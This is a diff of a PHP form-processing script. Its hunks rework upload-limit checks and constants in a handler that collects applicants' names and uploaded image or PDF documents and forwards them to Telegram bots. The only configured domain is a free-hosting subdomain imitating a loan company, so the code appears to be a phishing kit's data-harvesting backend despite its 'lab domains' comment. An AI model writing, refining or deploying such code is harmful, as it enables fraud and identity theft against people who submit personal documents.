@@ -5,10 +5,16 @@
 // ============================================================================
 ob_start();
 error_reporting(E_ALL);
-ini_set('display_errors', 0);
+ini_set('display_errors', 0); // Never show errors to end‑user in production
 ini_set('log_errors', 1);
 
-// --- Helper to parse PHP size strings (e.g., "128M" -> bytes) ---
+// ----------------------------------------------------------------------------
+// 🔧 SET YOUR DESIRED MAXIMUM FILE SIZE (in megabytes)
+// ----------------------------------------------------------------------------
+$desired_max_mb = 100;   // <-- CHANGE THIS to match your needs (e.g., 100)
+// ----------------------------------------------------------------------------
+
+// Helper to parse PHP size strings (e.g., "128M" -> bytes)
 function parse_ini_size($size) {
     $unit = strtolower(substr($size, -1));
     $value = (int)$size;
@@ -20,67 +26,39 @@ function parse_ini_size($size) {
     return $value;
 }
 
-// --- Pre‑flight check: are server upload limits high enough? ---
-$required_max_mb = 100;
+// Check actual server limits
 $upload_max_raw = ini_get('upload_max_filesize');
-$post_max_raw = ini_get('post_max_size');
+$post_max_raw   = ini_get('post_max_size');
 $upload_max_bytes = parse_ini_size($upload_max_raw);
-$post_max_bytes = parse_ini_size($post_max_raw);
-$required_bytes = $required_max_mb * 1024 * 1024;
+$post_max_bytes   = parse_ini_size($post_max_raw);
+$desired_bytes    = 50 * 1024 * 1024;
 
-if ($upload_max_bytes < $required_bytes || $post_max_bytes < $required_bytes) {
-    // Try to auto‑increase via .htaccess / .user.ini (same as before)
-    $doc_root = $_SERVER['DOCUMENT_ROOT'] ?? __DIR__;
-    $target_dir = rtrim($doc_root, '/') . '/';
-    $htaccess = $target_dir . '.htaccess';
-    $user_ini = $target_dir . '.user.ini';
-    $updated = false;
-
-    if (is_writable($target_dir)) {
-        if (file_exists($htaccess) && is_writable($htaccess)) {
-            $content = file_get_contents($htaccess);
-            if (strpos($content, 'php_value upload_max_filesize') === false) {
-                file_put_contents($htaccess, "\nphp_value upload_max_filesize {$required_max_mb}M\nphp_value post_max_size " . ($required_max_mb + 20) . "M\n", FILE_APPEND);
-                $updated = true;
-            }
-        } elseif (is_writable($target_dir)) {
-            file_put_contents($htaccess, "php_value upload_max_filesize {$required_max_mb}M\nphp_value post_max_size " . ($required_max_mb + 20) . "M\n");
-            $updated = true;
-        }
-        if (!$updated && file_exists($user_ini) && is_writable($user_ini)) {
-            $content = file_get_contents($user_ini);
-            if (strpos($content, 'upload_max_filesize') === false) {
-                file_put_contents($user_ini, "\nupload_max_filesize = {$required_max_mb}M\npost_max_size = " . ($required_max_mb + 20) . "M\n", FILE_APPEND);
-                $updated = true;
-            }
-        } elseif (!$updated && is_writable($target_dir)) {
-            file_put_contents($user_ini, "upload_max_filesize = {$required_max_mb}M\npost_max_size = " . ($required_max_mb + 20) . "M\n");
-            $updated = true;
-        }
-    }
-
-    if (!$updated) {
-        // If we cannot increase limits, show a friendly error and stop.
-        http_response_code(413);
-        echo "<!DOCTYPE html><html><head><title>Upload Limit Too Low</title></head><body>";
-        echo "<h2>⚠️ Cannot upload large files</h2>";
-        echo "<p>Your hosting provider limits file uploads to <strong>{$upload_max_raw}</strong> (and POST data to <strong>{$post_max_raw}</strong>).</p>";
-        echo "<p>To upload files up to {$required_max_mb}MB, you need to increase these limits.</p>";
-        echo "<ul><li>If you control the server, edit <code>php.ini</code> and restart.</li>";
-        echo "<li>If you use shared hosting, contact support or use files smaller than {$upload_max_raw}.</li>";
-        echo "<li>You can also try creating a <code>.htaccess</code> file manually with:<br>";
-        echo "<code>php_value upload_max_filesize {$required_max_mb}M<br>php_value post_max_size " . ($required_max_mb + 20) . "M</code></li></ul>";
-        echo "</body></html>";
-        exit;
-    } else {
-        // Limits were increased via config file – but they may not take effect until next request.
-        // Show a message asking the user to reload.
-        echo "<p>Server upload limits have been updated. Please <a href='javascript:location.reload()'>reload the form</a>.</p>";
-        exit;
-    }
+if ($upload_max_bytes < $desired_bytes || $post_max_bytes < $desired_bytes) {
+    http_response_code(413);
+    echo "<!DOCTYPE html><html><head><title>Upload Limit Too Low</title></head><body>";
+    echo "<h2>⚠️ Cannot process large file uploads</h2>";
+    echo "<p>This form is configured to accept files up to <strong>{$desired_max_mb} MB</strong>.<br>";
+    echo "Your hosting provider limits uploads to <strong>{$upload_max_raw}</strong> (POST data to <strong>{$post_max_raw}</strong>).</p>";
+    echo "<p><strong>Solutions:</strong></p>";
+    echo "<ul>";
+    echo "<li>Reduce the file size of your images/PDFs (e.g., compress them) to below {$upload_max_raw}.</li>";
+    echo "<li>Contact your hosting provider to increase <code>upload_max_filesize</code> and <code>post_max_size</code>.</li>";
+    echo "<li>If you control the server, edit <code>php.ini</code> and restart the web server.</li>";
+    echo "<li>Or change the <code>\$desired_max_mb</code> variable in this script to " . round($upload_max_bytes/1024/1024) . " MB (your host's current limit).</li>";
+    echo "</ul>";
+    echo "</body></html>";
+    exit;
 }
 
-// --- Your existing site_map and security constants (unchanged) ---
+// If we reach here, server limits are sufficient – define our constants
+define('MAX_FILE_SIZE', $desired_max_mb * 1024 * 1024);          // e.g., 100MB
+define('MAX_SUBMISSIONS_PER_HOUR', 10);
+define('CSRF_TOKEN_LIFETIME', 3600);
+define('ALLOWED_FILE_EXTENSIONS', ['jpg', 'jpeg', 'png', 'gif', 'pdf']);
+define('ALLOWED_MIME_TYPES', ['image/jpeg', 'image/png', 'image/gif', 'application/pdf']);
+define('TELEGRAM_MAX_FILE_SIZE', 50 * 1024 * 1024);              // Telegram's own limit (50MB)
+
+// --- Domain configuration (populate with your lab domains) ---
 $site_map = [
     "upstartloan.rf.gd" => [
         "bots" => [
@@ -98,19 +76,12 @@ $site_map = [
     ],
 ];
 
-define('MAX_FILE_SIZE', 100 * 1024 * 1024);          // 100MB per file
-define('MAX_SUBMISSIONS_PER_HOUR', 10);
-define('CSRF_TOKEN_LIFETIME', 3600);
-define('ALLOWED_FILE_EXTENSIONS', ['jpg', 'jpeg', 'png', 'gif', 'pdf']);
-define('ALLOWED_MIME_TYPES', ['image/jpeg', 'image/png', 'image/gif', 'application/pdf']);
-define('TELEGRAM_MAX_FILE_SIZE', 50 * 1024 * 1024);
-
 // ============================================================================
 // 🧠 HELPER FUNCTIONS
 // ============================================================================
 
 /**
- * Escape text for Telegram HTML parse_mode
+ * Escape text for Telegram HTML parse_mode (only allows safe tags)
  */
 function escape_telegram_html($text) {
     if (!is_string($text)) return '';
@@ -201,7 +172,7 @@ function validate_uploaded_file($file_key) {
 
     $file = $_FILES[$file_key];
 
-    // Handle array-style file inputs
+    // Handle array-style file inputs (multiple files with same name)
     if (is_array($file['name'])) {
         foreach (['name', 'type', 'tmp_name', 'error', 'size'] as $prop) {
             if (isset($file[$prop][0])) {
@@ -400,33 +371,16 @@ function send_telegram_file($bot_token, $chat_id, $file_path, $caption, $retries
 }
 
 // ============================================================================
-// 🚨 EARLY CHECKS (post_max_size / upload_max_filesize) - FIXED
+// 🚨 EARLY POST SIZE CHECK (more accurate than before)
 // ============================================================================
-function get_bytes_from_ini($value) {
-    $unit = strtolower(substr($value, -1));
-    $num = (int)$value;
-    switch ($unit) {
-        case 'g': $num *= 1024;
-        case 'm': $num *= 1024;
-        case 'k': $num *= 1024;
-    }
-    return $num;
-}
-
-$max_post_size_str = ini_get('post_max_size');
-$max_upload_size_str = ini_get('upload_max_filesize');
-$max_post_bytes = get_bytes_from_ini($max_post_size_str);
-$max_upload_bytes = get_bytes_from_ini($max_upload_size_str);
 $content_length = $_SERVER['CONTENT_LENGTH'] ?? 0;
-
-if ($content_length > $max_post_bytes) {
+if ($content_length > $post_max_bytes) {
     http_response_code(413);
-    exit("Request too large. Maximum POST size is {$max_post_size_str}.");
+    exit("Request too large. Maximum POST size is {$post_max_raw}.");
 }
-
 if (empty($_POST) && empty($_FILES) && $content_length > 0) {
     http_response_code(413);
-    exit("The uploaded data exceeds the server's maximum POST size ({$max_post_size_str}).");
+    exit("The uploaded data exceeds the server's maximum POST size ({$post_max_raw}).");
 }
 
 // ============================================================================
@@ -513,22 +467,18 @@ $required_uploads = [
 ];
 
 $uploaded_files = [];
-$upload_results = [];
 
 foreach ($required_uploads as $field => $label) {
     $validation = validate_uploaded_file($field);
 
     if (!$validation['valid']) {
         $errors[] = "$label: " . $validation['error'];
-        $upload_results[$field] = null;
     } else {
         $saved_path = save_uploaded_file($validation, preg_replace('/[^a-z0-9]/i', '_', $field));
         if (!$saved_path) {
             $errors[] = "$label: Failed to save file";
-            $upload_results[$field] = null;
         } else {
             $uploaded_files[$field] = $saved_path;
-            $upload_results[$field] = $saved_path;
         }
     }
 }
@@ -536,7 +486,6 @@ foreach ($required_uploads as $field => $label) {
 if (!empty($errors)) {
     log_entry("❌ Validation failed for $ip: " . implode('; ', $errors));
     http_response_code(400);
-
     if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&
         strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
         header('Content-Type: application/json');
@@ -644,6 +593,7 @@ $overall_success = $text_sent && $files_sent;
 if ($overall_success) {
     log_entry("✅ Submission successful for $ip ($full_name) - Domain: $domain");
 
+    // Clean up uploaded files after successful send
     foreach ($uploaded_files as $path) {
         if (file_exists($path)) @unlink($path);
     }
